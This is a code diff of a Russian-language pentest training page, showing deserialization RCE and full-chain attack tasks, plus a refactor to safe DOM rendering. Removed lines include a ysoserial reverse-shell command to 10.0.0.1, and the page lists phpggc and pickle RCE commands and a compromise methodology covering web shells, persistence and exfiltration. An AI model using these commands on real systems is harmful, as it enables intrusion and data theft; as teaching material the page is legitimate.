-                tools: ['ysoserial', 'phpggc', 'burpsuite', 'custom gadgets'],
-                vulnerability: {
-                    title: 'Уязвимость',
-                    content: 'Приложение десериализует данные от пользователя. Если есть доступные gadget chains — можно выполнить произвольный код.'
-                },
+                description: 'RCE через десериализацию.',
+                tools: ['ysoserial', 'phpggc'],
+                vulnerability: 'Десериализация недоверенных данных',
                 commands: [
-                    { cmd: 'java -jar ysoserial.jar CommonsCollections5 "bash -c \'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\'"', desc: 'Java deserialization RCE' },
-                    { cmd: 'phpggc Laravel/RCE5 "system(\'id\')"', desc: 'PHP deserialization через phpggc' },
-                    { cmd: "python3 -c \"import pickle,os; print(pickle.dumps(os.system('id')))\"", desc: 'Python pickle RCE' }
+                    'java -jar ysoserial.jar CommonsCollections5 "cmd"',
+                    'phpggc Laravel/RCE5 "system(\'id\')"',
+                    'python3 -c "import pickle; pickle.loads(data)"'
                 ],
-                realExample: {
-                    title: 'Реальный кейс',
-                    content: 'Java приложение использовало Apache Commons Collections. Через ysoserial создан serialized payload который при десериализации выполнял reverse shell. Получен полный доступ к серверу.'
-                },
-                solution: {
-                    title: 'Эксплуатация',
-                    steps: [
-                        'Определи язык/фреймворк по сигнатурам в serialized данных',
-                        'Для Java: используй ysoserial с найденными библиотеками в classpath',
-                        'Для PHP: phpggc с известными gadget chains (Laravel, Symfony, WordPress)',
-                        'Для Python: pickle.loads() выполняет код — ищи где приложение десериализует пользовательский ввод',
-                        'Найди gadget chain: какие классы доступны, какие методы вызываются при десериализации',
-                        'Если нет готового payload — ищи custom gadgets в коде приложения'
-                    ]
-                }
+                realExample: 'Java с Commons Collections. Через ysoserial создан payload с reverse shell.',
+                solution: [
+                    'Определи язык/фреймворк',
+                    'Java: ysoserial',
+                    'PHP: phpggc',
+                    'Ищи gadget chains'
+                ]
             },
             {
                 id: 15,
                 title: 'Full Chain Attack',
                 type: 'Advanced',
                 difficulty: 'Эксперт',
-                description: 'Комбинация нескольких уязвимостей для полного компрометации системы. Реальный сценарий pentest.',
-                tools: ['все вышеперечисленные', 'metasploit', 'custom exploits'],
-                vulnerability: {
-                    title: 'Цепочка атак',
-                    content: 'Одна уязвимость редко дает полный доступ. Нужна цепочка: recon → initial access → privilege escalation → persistence.'
-                },
+                description: 'Комбинация уязвимостей для полного взлома.',
+                tools: ['все вышеперечисленные'],
+                vulnerability: 'Цепочка: recon → access → escalation → persistence',
                 commands: [
-                    { cmd: 'subfinder + httpx + nuclei', desc: 'Автоматизированный recon и сканирование уязвимостей' },
-                    { cmd: 'sqlmap + file upload + reverse shell', desc: 'SQLi → загрузка shell → RCE' },
-                    { cmd: 'XSS → admin session → IDOR → data exfiltration', desc: 'XSS на админа → кража сессии → доступ к данным' }
+                    'subfinder + httpx + nuclei',
+                    'sqlmap + file upload + reverse shell',
+                    'XSS → admin session → IDOR'
                 ],
-                realExample: {
-                    title: 'Реальный кейс — полный взлом',
-                    content: '1) Subdomain enumeration нашел dev.target.com. 2) Directory brute force нашел /backup.zip с исходным кодом. 3) В коде найден hardcoded JWT secret. 4) Подделан токен с admin правами. 5) Через admin panel загружен web shell. 6) Reverse shell на сервер. 7) Privilege escalation через SUID binary. 8) Доступ к production БД с данными 1M пользователей.'
-                },
-                solution: {
-                    title: 'Методология полного взлома',
-                    steps: [
-                        'Recon: subdomain enumeration, port scanning, service detection, technology fingerprinting',
-                        'Vulnerability assessment: автоматическое сканирование (nuclei, nikto) + ручное тестирование',
-                        'Initial access: эксплуатация найденных уязвимостей (SQLi, XSS, file upload, RCE)',
-                        'Privilege escalation: поиск misconfigurations, SUID binaries, sudo права, writable файлы',
-                        'Lateral movement: движение по сети, доступ к другим серверам через украденные credentials',
-                        'Persistence: создание backdoor, добавление SSH ключей, cron jobs',
-                        'Data exfiltration: поиск и извлечение чувствительных данных (БД, файлы, credentials)',
-                        'Documentation: детальный отчет с шагами воспроизведения, impact, remediation'
-                    ]
-                }
+                realExample: '1) Subdomain enum. 2) Directory brute. 3) JWT secret в коде. 4) Подделан токен. 5) Web shell. 6) Reverse shell. 7) Escalation. 8) Доступ к БД с 1M пользователей.',
+                solution: [
+                    'Recon: subdomain, port scan',
+                    'Vulnerability assessment',
+                    'Initial access',
+                    'Privilege escalation',
+                    'Lateral movement',
+                    'Persistence',
+                    'Data exfiltration'
+                ]
             }
         ];
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
 
         function renderTasks() {
             const list = document.getElementById('taskList');
             const completed = JSON.parse(localStorage.getItem('hacking_completed') || '[]');
             
-            list.innerHTML = tasks.map(task => 
-                '<div class="task-card ' + (completed.indexOf(task.id) !== -1 ? 'completed' : '') + '" onclick="openTask(' + task.id + ')">' +
-                    '<div class="task-number">Задача ' + (task.id < 10 ? '0' : '') + task.id + '</div>' +
-                    '<div class="task-title">' + escapeHtml(task.title) + '</div>' +
-                    '<div class="task-type">' + escapeHtml(task.type) + '</div>' +
-                    '<div class="task-difficulty">' + escapeHtml(task.difficulty) + '</div>' +
-                '</div>'
-            ).join('');
+            list.innerHTML = '';
+            
+            tasks.forEach(task => {
+                const card = document.createElement('div');
+                card.className = 'task-card' + (completed.indexOf(task.id) !== -1 ? ' completed' : '');
+                card.onclick = function() { openTask(task.id); };
+                
+                const num = document.createElement('div');
+                num.className = 'task-number';
+                num.textContent = 'Задача ' + (task.id < 10 ? '0' : '') + task.id;
+                
+                const title = document.createElement('div');
+                title.className = 'task-title';
+                title.textContent = task.title;
+                
+                const type = document.createElement('div');
+                type.className = 'task-type';
+                type.textContent = task.type;
+                
+                const diff = document.createElement('div');
+                diff.className = 'task-difficulty';
+                diff.textContent = task.difficulty;
+                
+                card.appendChild(num);
+                card.appendChild(title);
+                card.appendChild(type);
+                card.appendChild(diff);
+                list.appendChild(card);
+            });
         }
 
         function openTask(id) {
@@ -693,52 +545,121 @@
             const modal = document.getElementById('modal');
             const content = document.getElementById('modalContent');
             
-            let html = '<button class="close-btn" onclick="closeModal()">×</button>';
-            html += '<h2 style="color:#00ff41;margin-bottom:10px;">' + escapeHtml(task.title) + '</h2>';
-            html += '<div style="color:#ffaa00;margin-bottom:20px;">' + escapeHtml(task.type) + ' // ' + escapeHtml(task.difficulty) + '</div>';
+            // Очищаем content
+            while (content.firstChild) {
+                content.removeChild(content.firstChild);
+            }
             
-            html += '<div class="section">';
-            html += '<div class="section-title">Описание</div>';
-            html += '<p>' + escapeHtml(task.description) + '</p>';
-            html += '</div>';
-
-            html += '<div class="vulnerability-info">';
-            html += '<h4>' + escapeHtml(task.vulnerability.title) + '</h4>';
-            html += '<p>' + escapeHtml(task.vulnerability.content) + '</p>';
-            html += '</div>';
-
-            html += '<div class="section">';
-            html += '<div class="section-title">Инструменты</div>';
-            html += '<div>' + task.tools.map(t => '<span class="tool-tag">' + escapeHtml(t) + '</span>').join('') + '</div>';
-            html += '</div>';
-
-            html += '<div class="section">';
-            html += '<div class="section-title">Команды и Payloads</div>';
+            // Close button
+            const closeBtn = document.createElement('button');
+            closeBtn.className = 'close-btn';
+            closeBtn.textContent = '×';
+            closeBtn.onclick = closeModal;
+            content.appendChild(closeBtn);
+            
+            // Title
+            const h2 = document.createElement('h2');
+            h2.style.color = '#00ff41';
+            h2.style.marginBottom = '10px';
+            h2.textContent = task.title;
+            content.appendChild(h2);
+            
+            // Type and difficulty
+            const meta = document.createElement('div');
+            meta.style.color = '#ffaa00';
+            meta.style.marginBottom = '20px';
+            meta.textContent = task.type + ' // ' + task.difficulty;
+            content.appendChild(meta);
+            
+            // Description
+            const descSection = document.createElement('div');
+            descSection.className = 'section';
+            const descTitle = document.createElement('div');
+            descTitle.className = 'section-title';
+            descTitle.textContent = 'Описание';
+            const descText = document.createElement('p');
+            descText.textContent = task.description;
+            descSection.appendChild(descTitle);
+            descSection.appendChild(descText);
+            content.appendChild(descSection);
+            
+            // Vulnerability
+            const vulnBox = document.createElement('div');
+            vulnBox.className = 'info-box vulnerability-info';
+            const vulnTitle = document.createElement('h4');
+            vulnTitle.textContent = 'Уязвимость';
+            const vulnText = document.createElement('p');
+            vulnText.textContent = task.vulnerability;
+            vulnBox.appendChild(vulnTitle);
+            vulnBox.appendChild(vulnText);
+            content.appendChild(vulnBox);
+            
+            // Tools
+            const toolsSection = document.createElement('div');
+            toolsSection.className = 'section';
+            const toolsTitle = document.createElement('div');
+            toolsTitle.className = 'section-title';
+            toolsTitle.textContent = 'Инструменты';
+            const toolsDiv = document.createElement('div');
+            task.tools.forEach(tool => {
+                const tag = document.createElement('span');
+                tag.className = 'tool-tag';
+                tag.textContent = tool;
+                toolsDiv.appendChild(tag);
+            });
+            toolsSection.appendChild(toolsTitle);
+            toolsSection.appendChild(toolsDiv);
+            content.appendChild(toolsSection);
+            
+            // Commands
+            const cmdSection = document.createElement('div');
+            cmdSection.className = 'section';
+            const cmdTitle = document.createElement('div');
+            cmdTitle.className = 'section-title';
+            cmdTitle.textContent = 'Команды';
+            cmdSection.appendChild(cmdTitle);
+            
             task.commands.forEach(cmd => {
-                html += '<div class="code-block">';
-                html += '<div class="command">$ ' + escapeHtml(cmd.cmd) + '</div>';
-                html += '<div class="comment"># ' + escapeHtml(cmd.desc) + '</div>';
-                html += '</div>';
+                const codeBlock = document.createElement('div');
+                codeBlock.className = 'code-block';
+                codeBlock.textContent = '$ ' + cmd;
+                cmdSection.appendChild(codeBlock);
             });
-            html += '</div>';
-
-            html += '<div class="real-example">';
-            html += '<h4>' + escapeHtml(task.realExample.title) + '</h4>';
-            html += '<p>' + escapeHtml(task.realExample.content) + '</p>';
-            html += '</div>';
-
-            html += '<div class="solution-box">';
-            html += '<h4>' + escapeHtml(task.solution.title) + '</h4>';
-            html += '<ol>';
-            task.solution.steps.forEach(step => {
-                html += '<li>' + escapeHtml(step) + '</li>';
-            });
-            html += '</ol>';
-            html += '</div>';
-
-            html += '<button class="mark-btn" onclick="markComplete(' + task.id + ')">Отметить как выполненное</button>';
+            content.appendChild(cmdSection);
             
-            content.innerHTML = html;
+            // Real example
+            const exampleBox = document.createElement('div');
+            exampleBox.className = 'info-box real-example';
+            const exampleTitle = document.createElement('h4');
+            exampleTitle.textContent = 'Реальный кейс';
+            const exampleText = document.createElement('p');
+            exampleText.textContent = task.realExample;
+            exampleBox.appendChild(exampleTitle);
+            exampleBox.appendChild(exampleText);
+            content.appendChild(exampleBox);
+            
+            // Solution
+            const solBox = document.createElement('div');
+            solBox.className = 'info-box solution-box';
+            const solTitle = document.createElement('h4');
+            solTitle.textContent = 'Методология';
+            const solList = document.createElement('ol');
+            task.solution.forEach(step => {
+                const li = document.createElement('li');
+                li.textContent = step;
+                solList.appendChild(li);
+            });
+            solBox.appendChild(solTitle);
+            solBox.appendChild(solList);
+            content.appendChild(solBox);
+            
+            // Mark button
+            const markBtn = document.createElement('button');
+            markBtn.className = 'mark-btn';
+            markBtn.textContent = 'Отметить как выполненное';
+            markBtn.onclick = function() { markComplete(id); };
+            content.appendChild(markBtn);
+            
             modal.classList.add('active');
         }
 
